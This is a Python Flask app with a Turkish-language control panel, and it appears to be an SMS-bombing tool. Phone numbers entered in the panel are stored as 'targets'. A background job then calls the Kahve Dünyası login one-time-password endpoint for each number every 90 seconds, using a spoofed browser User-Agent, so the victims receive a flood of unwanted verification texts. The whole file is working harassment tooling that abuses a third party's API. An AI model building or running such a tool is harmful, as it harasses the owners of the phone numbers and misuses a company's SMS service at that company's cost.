import os
import time
import requests
from flask import Flask, render_template, request, jsonify
from flask_apscheduler import APScheduler

app = Flask(__name__)
scheduler = APScheduler()

class Config:
    SCHEDULER_API_ENABLED = True

app.config.from_object(Config())

# Aktif numaralar: {telefon: başlangıç_zamanı}
active_targets = {}

def send_kahve_dunyasi_sms(phone_number):
    url = "https://api.kahvedunyasi.com/v1/login/otp"
    payload = {"mobile_number": phone_number, "channel": "sms"}
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
    }
    try:
        response = requests.post(url, json=payload, headers=headers, timeout=10)
        return response.status_code
    except:
        return "Hata"

@scheduler.task('interval', id='sms_job', seconds=90)
def scheduled_sms_job():
    for phone_number in list(active_targets.keys()):
        send_kahve_dunyasi_sms(phone_number)

@app.route('/')
def index():
    return """
    <!DOCTYPE html>
    <html lang="tr">
    <head>
        <meta charset="UTF-8">
        <title>SMS Yönetim Paneli</title>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
        <style>
            body { font-family: 'Segoe UI', sans-serif; background: #0f172a; color: #f8fafc; padding: 20px; }
            .container { max-width: 600px; margin: 0 auto; }
            .card { background: #1e293b; padding: 25px; border-radius: 12px; box-shadow: 0 10px 15px -3px rgba(0,0,0,0.5); margin-bottom: 20px; }
            input { width: 70%; padding: 12px; border-radius: 8px; border: 1px solid #334155; background: #0f172a; color: white; margin-right: 10px; }
            button { padding: 12px 20px; border-radius: 8px; border: none; background: #38bdf8; color: #0f172a; font-weight: bold; cursor: pointer; }
            table { width: 100%; border-collapse: collapse; margin-top: 20px; }
            th, td { padding: 12px; text-align: left; border-bottom: 1px solid #334155; }
            .btn-delete { background: #ef4444; color: white; padding: 5px 10px; border-radius: 5px; text-decoration: none; font-size: 12px; }
            .status-tag { color: #4ade80; font-size: 12px; font-weight: bold; }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="card">
                <h2><i class="fas fa-microchip"></i> SMS Kontrol Paneli</h2>
                <div style="display:flex;">
                    <input type="text" id="phone" placeholder="5XXXXXXXXX" maxlength="10">
                    <button onclick="addNumber()">EKLE</button>
                </div>
            </div>

            <div class="card">
                <h3><i class="fas fa-list"></i> Aktif İşlemler</h3>
                <table id="targetTable">
                    <thead>
                        <tr>
                            <th>Numara</th>
                            <th>Durum</th>
                            <th>İşlem</th>
                        </tr>
                    </thead>
                    <tbody id="tableBody"></tbody>
                </table>
            </div>
        </div>

        <script>
            function refreshTable() {
                fetch('/list').then(r => r.json()).then(data => {
                    const tbody = document.getElementById('tableBody');
                    tbody.innerHTML = '';
                    Object.keys(data).forEach(num => {
                        tbody.innerHTML += `
                            <tr>
                                <td>${num}</td>
                                <td><span class="status-tag">Çalışıyor (90s)</span></td>
                                <td><button class="btn-delete" onclick="removeNumber('${num}')">Durdur</button></td>
                            </tr>`;
                    });
                });
            }

            function addNumber() {
                const p = document.getElementById('phone').value;
                fetch('/start', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({phone: p})
                }).then(() => { refreshTable(); document.getElementById('phone').value = ''; });
            }

            function removeNumber(num) {
                fetch('/stop', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({phone: num})
                }).then(() => refreshTable());
            }

            setInterval(refreshTable, 5000); // Tabloyu her 5 saniyede bir güncelle
            refreshTable();
        </script>
    </body>
    </html>
    """

@app.route('/list')
def list_targets():
    return jsonify(active_targets)

@app.route('/start', methods=['POST'])
def start():
    phone = request.json.get('phone')
    if phone and len(phone) == 10:
        active_targets[phone] = time.ctime()
        send_kahve_dunyasi_sms(phone)
        return jsonify({"status": "ok"})
    return jsonify({"status": "error"}), 400

@app.route('/stop', methods=['POST'])
def stop():
    phone = request.json.get('phone')
    if phone in active_targets:
        del active_targets[phone]
        return jsonify({"status": "stopped"})
    return jsonify({"status": "error"}), 400

if not scheduler.running:
    scheduler.init_app(app)
    scheduler.start()

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
